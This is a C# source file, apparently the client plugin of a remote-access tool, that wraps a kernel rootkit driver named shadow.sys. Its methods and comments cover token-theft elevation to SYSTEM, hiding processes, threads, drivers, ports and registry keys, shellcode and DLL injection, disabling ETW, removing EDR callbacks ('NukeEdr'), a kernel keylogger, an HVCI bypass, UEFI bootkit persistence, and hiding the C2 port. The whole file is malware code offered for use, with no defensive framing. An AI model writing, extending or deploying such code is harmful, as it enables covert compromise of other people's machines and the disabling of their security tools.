using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Plugins.Client.Modules
{
    /// <summary>
    /// Ultimate Shadow Core Wrapper - High-level API for ALL kernel driver functions.
    /// Exposes process hiding, injection, EDR bypass, network hiding, and God-Tier operations.
    /// </summary>
    public class ShadowWrapper : IDisposable
    {
        private readonly KernelController _kernel;
        private bool _connected;

        public ShadowWrapper()
        {
            _kernel = new KernelController();
        }

        /// <summary>
        /// Connect to Shadow kernel driver
        /// </summary>
        public bool Connect()
        {
            _connected = _kernel.Connect();
            return _connected;
        }

        /// <summary>
        /// Check if connected to kernel driver
        /// </summary>
        public bool IsConnected => _connected;

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 PROCESS OPERATIONS - 6 IOCTLs
        #endregion

        /// <summary>
        /// Elevate process to SYSTEM via token theft
        /// </summary>
        public bool ElevateProcess(int pid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = new IntPtr(pid), Enable = true };
            return _kernel.SendIoctl(KernelController.ELEVATE_PROCESS, ref target);
        }

        /// <summary>
        /// Hide process using DKOM (Direct Kernel Object Manipulation)
        /// </summary>
        public bool HideProcess(int pid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = new IntPtr(pid), Enable = true };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_PROCESS, ref target);
        }

        /// <summary>
        /// Unhide previously hidden process
        /// </summary>
        public bool UnhideProcess(int pid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = new IntPtr(pid), Enable = false };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_PROCESS, ref target);
        }

        /// <summary>
        /// Hide the current process calling this wrapper
        /// </summary>
        public bool HideSelf()
        {
            return HideProcess(System.Diagnostics.Process.GetCurrentProcess().Id);
        }

        /// <summary>
        /// Force terminate any process (even protected)
        /// </summary>
        public bool TerminateProcess(int pid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = new IntPtr(pid), Enable = true };
            return _kernel.SendIoctl(KernelController.TERMINATE_PROCESS, ref target);
        }

        /// <summary>
        /// Set process protection signature (PP/PPL)
        /// </summary>
        /// <param name="signatureLevel">Signature level (e.g., 0x3F for Windows)</param>
        /// <param name="protectionType">Protection type (e.g., 0x02 forn Windows)</param>
        public bool SetProcessSignature(int pid, int signatureLevel, int protectionType)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess
            {
                Pid = new IntPtr(pid),
                Enable = true,
                Sg = new IntPtr(signatureLevel),
                Tp = new IntPtr(protectionType)
            };
            return _kernel.SendIoctl(KernelController.SIGNATURE_PROCESS, ref target);
        }

        /// <summary>
        /// Enable/Disable process protection
        /// </summary>
        public bool ProtectProcess(int pid, bool enable)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = new IntPtr(pid), Enable = enable };
            return _kernel.SendIoctl(KernelController.PROTECT_PROCESS, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 THREAD OPERATIONS - 3 IOCTLs
        #endregion

        /// <summary>
        /// Protect thread from termination/suspension
        /// </summary>
        public bool ProtectThread(int tid, bool enable)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetThread { Tid = new IntPtr(tid), Enable = enable };
            return _kernel.SendIoctl(KernelController.PROTECTION_THREAD, ref target);
        }

        /// <summary>
        /// Hide thread from debuggers and enumeration
        /// </summary>
        public bool HideThread(int tid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetThread { Tid = new IntPtr(tid), Enable = true };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_THREAD, ref target);
        }

        /// <summary>
        /// Unhide previously hidden thread
        /// </summary>
        public bool UnhideThread(int tid)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetThread { Tid = new IntPtr(tid), Enable = false };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_THREAD, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 DRIVER OPERATIONS - 3 IOCTLs
        #endregion

        /// <summary>
        /// Hide driver from PsLoadedModuleList
        /// </summary>
        public bool HideDriver(string driverName)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetDriver { Name = driverName, Enable = true };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_DRIVER, ref target);
        }

        /// <summary>
        /// Unhide previously hidden driver
        /// </summary>
        public bool UnhideDriver(string driverName)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetDriver { Name = driverName, Enable = false };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_DRIVER, ref target);
        }

        /// <summary>
        /// Block driver from loading
        /// </summary>
        public bool BlockDriver(string driverName, bool block)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetDriver { Name = driverName, Enable = block };
            return _kernel.SendIoctl(KernelController.BLOCK_DRIVER, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 NETWORK OPERATIONS - 1 IOCTL
        #endregion

        /// <summary>
        /// Hide network port from netstat and connection viewers
        /// </summary>
        /// <param name="protocol">0 = TCP, 1 = UDP</param>
        /// <param name="portType">0 = LOCAL, 1 = REMOTE</param>
        public bool HidePort(int protocol, int portType, ushort port)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetPort
            {
                Protocol = protocol,
                PortType = portType,
                PortNumber = port,
                Enable = true
            };
            return _kernel.SendIoctl(KernelController.HIDE_PORT, ref target);
        }

        /// <summary>
        /// Unhide previously hidden port
        /// </summary>
        public bool UnhidePort(int protocol, int portType, ushort port)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetPort
            {
                Protocol = protocol,
                PortType = portType,
                PortNumber = port,
                Enable = false
            };
            return _kernel.SendIoctl(KernelController.HIDE_PORT, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 SECURITY BYPASS - 2 IOCTLs
        #endregion

        /// <summary>
        /// Toggle Driver Signature Enforcement (DSE)
        /// </summary>
        public bool ToggleDSE(bool enable)
        {
            if (!_connected) return false;
            var target = new KernelController.BoolStruct { Enable = enable };
            return _kernel.SendIoctl(KernelController.ENABLE_DSE, ref target);
        }

        /// <summary>
        /// Disable ETW (Event Tracing for Windows) - Blinds EDRs
        /// </summary>
        public bool DisableEtw()
        {
            if (!_connected) return false;
            var target = new KernelController.BoolStruct { Enable = false };
            return _kernel.SendIoctl(KernelController.ETWTI, ref target);
        }

        /// <summary>
        /// Enable ETW (restore)
        /// </summary>
        public bool EnableEtw()
        {
            if (!_connected) return false;
            var target = new KernelController.BoolStruct { Enable = true };
            return _kernel.SendIoctl(KernelController.ETWTI, ref target);
        }

        /// <summary>
        /// Get kernel-level keylogger buffer address
        /// </summary>
        public IntPtr GetKeyloggerAddress()
        {
            if (!_connected) return IntPtr.Zero;
            return _kernel.GetKeyloggerAddress();
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 CALLBACK OPERATIONS - 3 IOCTLs (EDR KILLER)
        #endregion

        /// <summary>
        /// Remove security callback (EDR killer)
        /// </summary>
        /// <param name="callbackType">Type of callback (see Rust enum)</param>
        /// <param name="index">Index in callback array</param>
        public bool RemoveCallback(int callbackType, int index)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetCallback { CallbackType = callbackType, Index = index };
            return _kernel.SendIoctl(KernelController.REMOVE_CALLBACK, ref target);
        }

        /// <summary>
        /// Restore previously removed callback
        /// </summary>
        public bool RestoreCallback(int callbackType, int index)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetCallback { CallbackType = callbackType, Index = index };
            return _kernel.SendIoctl(KernelController.RESTORE_CALLBACK, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 REGISTRY OPERATIONS - 4 IOCTLs
        #endregion

        /// <summary>
        /// Protect registry value from modification
        /// </summary>
        public bool ProtectRegistryValue(string key, string valueName, bool enable)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetRegistry { Key = key, Value = valueName, Enable = enable };
            return _kernel.SendIoctl(KernelController.REGISTRY_PROTECTION_VALUE, ref target);
        }

        /// <summary>
        /// Protect registry key from modification
        /// </summary>
        public bool ProtectRegistryKey(string key, bool enable)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetRegistry { Key = key, Value = "", Enable = enable };
            return _kernel.SendIoctl(KernelController.REGISTRY_PROTECTION_KEY, ref target);
        }

        /// <summary>
        /// Hide registry key from enumeration
        /// </summary>
        public bool HideRegistryKey(string key, bool hide)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetRegistry { Key = key, Value = "", Enable = hide };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_KEY, ref target);
        }

        /// <summary>
        /// Hide registry value from enumeration
        /// </summary>
        public bool HideRegistryValue(string key, string valueName, bool hide)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetRegistry { Key = key, Value = valueName, Enable = hide };
            return _kernel.SendIoctl(KernelController.HIDE_UNHIDE_VALUE, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 MODULE OPERATIONS - 2 IOCTLs
        #endregion

        /// <summary>
        /// Hide module (DLL) from process - Invisible to Process Explorer
        /// </summary>
        public bool HideModule(int pid, string moduleName)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetModule { Pid = new IntPtr(pid), Name = moduleName };
            return _kernel.SendIoctl(KernelController.HIDE_MODULE, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 🔥 INJECTION OPERATIONS - 5 IOCTLs
        #endregion

        /// <summary>
        /// Inject shellcode using remote thread
        /// </summary>
        public bool InjectShellcodeThread(int pid, string shellcodePath)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = new IntPtr(pid), Path = shellcodePath };
            return _kernel.SendIoctl(KernelController.INJECTION_SHELLCODE_THREAD, ref target);
        }

        /// <summary>
        /// Inject shellcode using APC (Asynchronous Procedure Call)
        /// </summary>
        public bool InjectShellcodeApc(int pid, string shellcodePath)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = new IntPtr(pid), Path = shellcodePath };
            return _kernel.SendIoctl(KernelController.INJECTION_SHELLCODE_APC, ref target);
        }

        /// <summary>
        /// Inject shellcode using thread hijacking (stealthiest)
        /// </summary>
        public bool InjectShellcodeHijack(int pid, string shellcodePath)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = new IntPtr(pid), Path = shellcodePath };
            return _kernel.SendIoctl(KernelController.INJECTION_SHELLCODE_THREAD_HIJACKING, ref target);
        }

        /// <summary>
        /// Inject DLL using remote thread
        /// </summary>
        public bool InjectDllThread(int pid, string dllPath)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = new IntPtr(pid), Path = dllPath };
            return _kernel.SendIoctl(KernelController.INJECTION_DLL_THREAD, ref target);
        }

        /// <summary>
        /// Inject DLL using APC (Asynchronous Procedure Call)
        /// </summary>
        public bool InjectDllApc(int pid, string dllPath)
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = new IntPtr(pid), Path = dllPath };
            return _kernel.SendIoctl(KernelController.INJECTION_DLL_APC, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 👑 GOD-TIER OPERATIONS - 3 IOCTLs
        #endregion

        /// <summary>
        /// Bypass Hypervisor-protected Code Integrity (HVCI)
        /// </summary>
        public bool BypassHVCI()
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
            return _kernel.SendIoctl(KernelController.HVCI_BYPASS, ref target);
        }

        /// <summary>
        /// Install UEFI persistence (bootkit)
        /// </summary>
        public bool InstallUefiPersistence(string payloadPath = "C:\\Windows\\System32\\shadow.sys")
        {
            if (!_connected) return false;
            var target = new KernelController.TargetInjection { Pid = IntPtr.Zero, Path = payloadPath };
            return _kernel.SendIoctl(KernelController.UEFI_PERSIST, ref target);
        }

        /// <summary>
        /// Check if running in VM/Sandbox (kernel-level detection)
        /// </summary>
        /// <returns>True if NOT in VM (safe), False if VM detected</returns>
        public bool CheckAntiVm()
        {
            if (!_connected) return false;
            var target = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
            return _kernel.SendIoctl(KernelController.ANTIVM_CHECK, ref target);
        }

        #region ═══════════════════════════════════════════════════════════════════════════
        // 💀 CONVENIENCE METHODS - COMBINED OPERATIONS
        #endregion

        /// <summary>
        /// Full stealth mode - Hide process + driver + disable ETW
        /// </summary>
        public bool ActivateFullStealth(int pid)
        {
            bool success = true;
            // Always prioritize kernel-level DKOM over fragile user-mode hooks
            success &= HideProcess(pid);
            success &= HideDriver("shadow.sys");
            success &= DisableEtw();
            
            // Protect current configuration in registry
            success &= ProtectRegistryKey("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\shadow", true);
            
            return success;
        }

        /// <summary>
        /// Become SYSTEM with hidden process
        /// </summary>
        public bool BecomeGhost(int pid)
        {
            bool success = true;
            success &= ElevateProcess(pid);
            success &= HideProcess(pid);
            return success;
        }

        /// <summary>
        /// Ultimate EDR bypass - Remove common EDR callbacks
        /// </summary>
        public bool NukeEdr()
        {
            bool success = true;
            // Remove ProcessNotify callbacks (type 0)
            for (int i = 0; i < 64; i++)
            {
                RemoveCallback(0, i); // Best effort, some may fail
            }
            // Remove ThreadNotify callbacks (type 1)
            for (int i = 0; i < 64; i++)
            {
                RemoveCallback(1, i);
            }
            // Remove ImageLoad callbacks (type 2)
            for (int i = 0; i < 8; i++)
            {
                RemoveCallback(2, i);
            }
            success &= DisableEtw();
            return success;
        }

        /// <summary>
        /// Hide C2 connection port
        /// </summary>
        public bool HideC2Port(ushort port)
        {
            return HidePort(0, 1, port); // TCP REMOTE
        }

        public void Dispose()
        {
            _kernel?.Dispose();
        }
    }
}
